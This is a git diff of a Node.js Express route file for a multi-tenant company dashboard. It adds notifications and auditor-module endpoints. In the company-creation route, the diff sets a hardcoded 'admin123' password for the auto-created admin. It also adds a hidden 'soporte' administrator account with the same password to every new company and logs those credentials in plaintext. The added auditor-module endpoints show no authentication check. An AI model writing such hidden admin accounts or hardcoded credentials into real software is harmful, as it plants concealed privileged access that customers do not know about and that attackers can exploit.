@@ -13,6 +13,10 @@ console.log('🔄 Cargando aponntDashboard routes...');
 const { sequelize, Company, User, Branch } = require('../config/database');
 console.log('✅ Modelos PostgreSQL cargados correctamente');
 
+// Servicios
+const aponntNotificationService = require('../services/AponntNotificationService');
+console.log('🔔 Servicio de notificaciones Aponnt cargado');
+
 // DEPRECADO: Los modelos Memory serán removidos
 // const BranchMemory = require('../models/BranchMemory');
 // const UserMemory = require('../models/UserMemory');
@@ -762,17 +766,38 @@ router.post('/companies', async (req, res) => {
 
     console.log(`✅ Nueva empresa creada: ${newCompany.name} (ID: ${newCompany.id})`);
 
-    // Crear usuario administrador automáticamente
+    // 🔔 ENVIAR NOTIFICACIONES AUTOMÁTICAS (APONNT → EMPRESA)
+    try {
+      const notificationData = {
+        id: newCompany.id,
+        name: newCompany.name,
+        contactEmail: newCompany.contact_email,
+        licenseType: newCompany.licenseType,
+        maxEmployees: newCompany.maxEmployees,
+        modules: modules,
+        slug: slug
+      };
+
+      console.log('🔔 Enviando notificaciones de bienvenida...');
+      await aponntNotificationService.notifyNewCompany(notificationData);
+      console.log('✅ Notificaciones enviadas exitosamente');
+    } catch (notifError) {
+      // No fallar la creación si las notificaciones fallan
+      console.error('⚠️ Error enviando notificaciones (empresa creada exitosamente):', notifError.message);
+    }
+
+    // Crear usuarios administradores automáticamente
     try {
       const bcrypt = require('bcryptjs');
-      const adminPassword = '123456';
+      const adminPassword = 'admin123';
       const hashedPassword = await bcrypt.hash(adminPassword, 12);
 
+      // 1. Usuario ADMIN - Para el cliente
       const adminUser = await User.create({
-        employeeId: 'ADM' + String(newCompany.id).padStart(3, '0'),
-        usuario: 'admin' + newCompany.id,
+        employeeId: 'ADM-' + String(newCompany.id).padStart(3, '0'),
+        usuario: 'admin',
         firstName: 'Administrador',
-        lastName: 'Sistema',
+        lastName: 'Principal',
         email: contactEmail,
         password: hashedPassword,
         role: 'admin',
@@ -780,9 +805,27 @@ router.post('/companies', async (req, res) => {
         isActive: true
       });
 
-      console.log(`👤 Admin creado automáticamente: "${adminUser.usuario}" para empresa ${newCompany.name} con contraseña: ${adminPassword}`);
+      console.log(`👤 Usuario ADMIN creado: "admin" para empresa ${newCompany.name} (contraseña: ${adminPassword})`);
+
+      // 2. Usuario SOPORTE - Para auditoría y soporte técnico (OCULTO)
+      const supportUser = await User.create({
+        employeeId: 'SUPPORT-' + String(newCompany.id).padStart(3, '0'),
+        usuario: 'soporte',
+        firstName: 'Soporte',
+        lastName: 'Técnico Sistema',
+        email: 'soporte' + newCompany.id + '@sistema.local',
+        password: hashedPassword, // Misma contraseña: admin123
+        role: 'admin',
+        company_id: newCompany.id,
+        isActive: true
+      });
+
+      console.log(`🔧 Usuario SOPORTE creado: "soporte" para empresa ${newCompany.name} (contraseña: ${adminPassword})`);
+      console.log(`📋 Credenciales de auditoría - Empresa: ${slug} | Usuario: soporte | Contraseña: ${adminPassword}`);
+
     } catch (adminError) {
-      console.error('⚠️ Error creando admin automático (empresa creada exitosamente):', adminError);
+      console.error('⚠️ Error creando usuarios automáticos (empresa creada exitosamente):', adminError);
+      console.error(adminError);
     }
 
     res.status(201).json({
@@ -1060,6 +1103,28 @@ router.put('/companies/:id', async (req, res) => {
       console.log(`✅ Empresa ID ${id} actualizada exitosamente: ${maxEmployees} empleados`);
     }
     console.log(`📦 Módulos activos en company_modules: ${updatedCompany ? JSON.parse(updatedCompany.active_company_modules || '[]').length : 0}`);
+
+    // 🔔 ENVIAR NOTIFICACIONES DE CAMBIO (SI HUBO CAMBIOS EN MÓDULOS/PRECIO)
+    try {
+      // Detectar si hubo cambios significativos
+      const hadChanges = modulesToActivate?.length > 0 || modulesToDeactivate?.length > 0 ||
+                         Math.abs(monthlyTotal - (updatedCompany?.monthly_total || 0)) > 0.01;
+
+      if (hadChanges) {
+        console.log('🔔 Detectados cambios en módulos/facturación, enviando notificaciones...');
+
+        await aponntNotificationService.notifyModuleChange(id, {
+          added: modulesToActivate || [],
+          removed: modulesToDeactivate || [],
+          newTotal: monthlyTotal,
+          previousTotal: updatedCompany?.monthly_total || 0
+        });
+
+        console.log('✅ Notificaciones de cambio enviadas');
+      }
+    } catch (notifError) {
+      console.error('⚠️ Error enviando notificaciones de cambio:', notifError.message);
+    }
 
     // Prepare response with safe data access
     const responseCompany = updatedCompany ? {
@@ -3404,6 +3469,306 @@ router.get('/dashboard/vendors', async (req, res) => {
       success: false,
       message: 'Error obteniendo vendedores',
       error: error.message
+    });
+  }
+});
+
+// ==========================================
+// SUPPORT TOOL MANAGEMENT (AUDITOR MODULE)
+// ==========================================
+
+// POST /companies/:companyId/support-tools/assign - Asignar módulo auditor temporalmente
+router.post('/companies/:companyId/support-tools/assign', async (req, res) => {
+  try {
+    const { companyId } = req.params;
+    const { moduleId, reason, assignedBy } = req.body;
+
+    // Validaciones
+    const validCompanyId = validateNumericId(companyId, 'Company ID');
+
+    if (!moduleId || moduleId !== 'auditor-dashboard') {
+      return res.status(400).json({
+        success: false,
+        error: 'Solo se puede asignar el módulo auditor-dashboard'
+      });
+    }
+
+    if (!reason || !assignedBy) {
+      return res.status(400).json({
+        success: false,
+        error: 'Se requiere razón y responsable de la asignación'
+      });
+    }
+
+    // Buscar la empresa
+    const company = await Company.findOne({
+      where: { company_id: validCompanyId }
+    });
+
+    if (!company) {
+      return res.status(404).json({
+        success: false,
+        error: 'Empresa no encontrada'
+      });
+    }
+
+    // Obtener módulos activos actuales - adaptado a formato panel-empresa
+    let activeModules = company.activeModules || [];
+
+    // Si es string JSON, parsearlo
+    if (typeof activeModules === 'string') {
+      try {
+        activeModules = JSON.parse(activeModules);
+      } catch (e) {
+        activeModules = [];
+      }
+    }
+
+    // Si es array, está bien (formato correcto del panel-empresa)
+    if (Array.isArray(activeModules)) {
+      // Filtrar solo strings válidos (eliminar [object Object] corrupto)
+      activeModules = activeModules.filter(module => typeof module === 'string' && module.trim() !== '');
+    } else {
+      // Si es objeto (formato legacy), convertir a array vacío
+      activeModules = [];
+    }
+
+    // Verificar si ya está asignado
+    if (activeModules.includes('auditor-dashboard')) {
+      return res.status(400).json({
+        success: false,
+        error: 'El módulo auditor ya está asignado a esta empresa'
+      });
+    }
+
+    // Agregar el módulo auditor
+    activeModules.push('auditor-dashboard');
+    console.log(`🔧 [ASSIGN] Antes de update - activeModules:`, activeModules);
+
+    // Actualizar la empresa (usar array JSONB directamente, compatible con panel-empresa)
+    const updateResult = await company.update({
+      activeModules: activeModules,
+      updated_at: new Date()
+    });
+    console.log(`🔧 [ASSIGN] Resultado de update:`, updateResult);
+
+    // Verificar que se guardó correctamente
+    await company.reload();
+    console.log(`🔧 [ASSIGN] Después de reload - active_modules:`, company.activeModules);
+
+    // Log de la asignación
+    console.log(`🔧 [SUPPORT] Módulo auditor asignado a empresa ${validCompanyId} por ${assignedBy}: ${reason}`);
+
+    res.json({
+      success: true,
+      message: 'Módulo auditor asignado temporalmente',
+      data: {
+        companyId: validCompanyId,
+        companyName: company.name,
+        moduleId: 'auditor-dashboard',
+        assignedBy,
+        reason,
+        assignedAt: new Date(),
+        activeModules: activeModules.length
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Error asignando módulo auditor:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Error interno del servidor',
+      details: error.message
+    });
+  }
+});
+
+// DELETE /companies/:companyId/support-tools/unassign - Desasignar módulo auditor
+router.delete('/companies/:companyId/support-tools/unassign', async (req, res) => {
+  try {
+    const { companyId } = req.params;
+    const { moduleId, reason, unassignedBy } = req.body;
+
+    // Validaciones
+    const validCompanyId = validateNumericId(companyId, 'Company ID');
+
+    if (!moduleId || moduleId !== 'auditor-dashboard') {
+      return res.status(400).json({
+        success: false,
+        error: 'Solo se puede desasignar el módulo auditor-dashboard'
+      });
+    }
+
+    if (!reason || !unassignedBy) {
+      return res.status(400).json({
+        success: false,
+        error: 'Se requiere razón y responsable de la desasignación'
+      });
+    }
+
+    // Buscar la empresa
+    const company = await Company.findOne({
+      where: { company_id: validCompanyId }
+    });
+
+    if (!company) {
+      return res.status(404).json({
+        success: false,
+        error: 'Empresa no encontrada'
+      });
+    }
+
+    // Obtener módulos activos actuales - adaptado a formato panel-empresa
+    let activeModules = company.activeModules || [];
+
+    // Si es string JSON, parsearlo
+    if (typeof activeModules === 'string') {
+      try {
+        activeModules = JSON.parse(activeModules);
+      } catch (e) {
+        activeModules = [];
+      }
+    }
+
+    // Si es array, está bien (formato correcto del panel-empresa)
+    if (Array.isArray(activeModules)) {
+      // Filtrar solo strings válidos (eliminar [object Object] corrupto)
+      activeModules = activeModules.filter(module => typeof module === 'string' && module.trim() !== '');
+    } else {
+      // Si es objeto (formato legacy), convertir a array vacío
+      activeModules = [];
+    }
+
+    // Verificar si está asignado
+    if (!activeModules.includes('auditor-dashboard')) {
+      return res.status(400).json({
+        success: false,
+        error: 'El módulo auditor no está asignado a esta empresa'
+      });
+    }
+
+    // Remover el módulo auditor
+    activeModules = activeModules.filter(module => module !== 'auditor-dashboard');
+
+    // Actualizar la empresa (usar array JSONB directamente, compatible con panel-empresa)
+    await company.update({
+      activeModules: activeModules,
+      updated_at: new Date()
+    });
+
+    // Log de la desasignación
+    console.log(`🔧 [SUPPORT] Módulo auditor desasignado de empresa ${validCompanyId} por ${unassignedBy}: ${reason}`);
+
+    res.json({
+      success: true,
+      message: 'Módulo auditor desasignado correctamente',
+      data: {
+        companyId: validCompanyId,
+        companyName: company.name,
+        moduleId: 'auditor-dashboard',
+        unassignedBy,
+        reason,
+        unassignedAt: new Date(),
+        activeModules: activeModules.length
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Error desasignando módulo auditor:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Error interno del servidor',
+      details: error.message
+    });
+  }
+});
+
+// GET /companies/:companyId/support-tools/status - Verificar estado del módulo auditor
+router.get('/companies/:companyId/support-tools/status', async (req, res) => {
+  try {
+    const { companyId } = req.params;
+    const validCompanyId = validateNumericId(companyId, 'Company ID');
+
+    // Buscar la empresa (forzar reload desde BD para evitar cache)
+    const company = await Company.findOne({
+      where: { company_id: validCompanyId },
+      raw: false // Asegurar que sea instancia de Sequelize para reload
+    });
+
+    if (!company) {
+      return res.status(404).json({
+        success: false,
+        error: 'Empresa no encontrada'
+      });
+    }
+
+    // Forzar recarga desde BD para evitar problemas de cache
+    await company.reload();
+    console.log(`🔄 [STATUS] Después de reload, active_modules:`, company.activeModules);
+
+    // Obtener módulos activos actuales - adaptado a formato panel-empresa
+    let activeModules = company.activeModules || [];
+    console.log(`🔍 [STATUS] Módulos raw de la BD para empresa ${validCompanyId}:`, activeModules);
+
+    // Si es string JSON, parsearlo
+    if (typeof activeModules === 'string') {
+      try {
+        activeModules = JSON.parse(activeModules);
+        console.log(`🔧 [STATUS] Después de JSON.parse:`, activeModules);
+      } catch (e) {
+        console.log(`❌ [STATUS] Error parseando JSON:`, e.message);
+        activeModules = [];
+      }
+    }
+
+    // Si es array, está bien (formato correcto del panel-empresa)
+    if (Array.isArray(activeModules)) {
+      console.log(`📋 [STATUS] Antes del filtro (array):`, activeModules);
+
+      // Filtrar solo strings válidos (eliminar [object Object] corrupto)
+      const originalLength = activeModules.length;
+      activeModules = activeModules.filter(module => typeof module === 'string' && module.trim() !== '');
+      console.log(`✨ [STATUS] Después del filtro:`, activeModules);
+
+      // Si se eliminaron elementos corruptos, actualizar la BD
+      if (originalLength !== activeModules.length) {
+        console.log(`🧹 [CLEANUP] Detectado ${originalLength - activeModules.length} elementos corruptos, limpiando BD...`);
+        try {
+          await company.update({
+            activeModules: activeModules
+          });
+          console.log(`✅ [CLEANUP] BD actualizada con datos limpios:`, activeModules);
+        } catch (cleanupError) {
+          console.error(`❌ [CLEANUP] Error actualizando BD:`, cleanupError.message);
+        }
+      }
+    } else {
+      console.log(`🔄 [STATUS] No es array, convirtiendo a array vacío. Tipo:`, typeof activeModules);
+      // Si es objeto (formato legacy), convertir a array vacío
+      activeModules = [];
+    }
+
+    const hasAuditor = activeModules.includes('auditor-dashboard');
+    console.log(`🎯 [STATUS] ¿Tiene auditor-dashboard?`, hasAuditor);
+    console.log(`📊 [STATUS] Lista final de módulos:`, activeModules);
+
+    res.json({
+      success: true,
+      data: {
+        companyId: validCompanyId,
+        companyName: company.name,
+        hasAuditorModule: hasAuditor,
+        totalActiveModules: activeModules.length,
+        activeModules
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Error verificando estado del módulo auditor:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Error interno del servidor',
+      details: error.message
     });
   }
 });
